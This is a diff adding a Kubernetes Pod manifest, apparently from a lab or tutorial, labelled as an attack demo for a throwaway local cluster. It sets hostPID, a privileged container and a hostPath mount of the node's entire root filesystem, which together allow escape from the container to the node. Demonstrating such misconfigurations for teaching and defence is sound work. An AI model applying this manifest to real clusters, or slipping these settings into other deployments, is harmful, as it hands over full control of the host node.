@@ -1,0 +1,22 @@
+# THE ATTACK. Three independently dangerous fields.
+# Apply this to a throwaway LOCAL cluster only.
+apiVersion: v1
+kind: Pod
+metadata:
+  name: escape
+  namespace: team-alpha
+spec:
+  hostPID: true                    # see every process on the node
+  containers:
+    - name: shell
+      image: alpine:3.20
+      command: ["sleep", "infinity"]
+      securityContext:
+        privileged: true           # every Linux capability, all host devices
+      volumeMounts:
+        - name: host
+          mountPath: /host
+  volumes:
+    - name: host
+      hostPath:
+        path: /                    # the node's entire root filesystem
